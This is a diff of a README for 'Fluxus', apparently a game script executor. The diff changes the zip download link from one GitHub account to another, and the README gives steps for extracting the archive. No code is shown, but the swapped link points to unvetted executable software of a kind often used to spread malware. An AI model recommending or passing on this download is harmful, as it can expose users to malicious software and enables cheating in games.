@@ -2,7 +2,7 @@
 Fluxus is an level 8 executor that has Minimalistic and Modern UI
 
 # 📁 〢 Setting up Fluxus
-1. Download the [Fluxus](https://github.com/DtKdPython/Fluxus/archive/refs/heads/main.zip)
+1. Download the [Fluxus](https://github.com/Peakscriptss/Fluxus/archive/refs/heads/main.zip)
 2. Extract the .zip file
 - How do i Extract a .zip file?
    1. Open File Explorer and find the zipped folder.
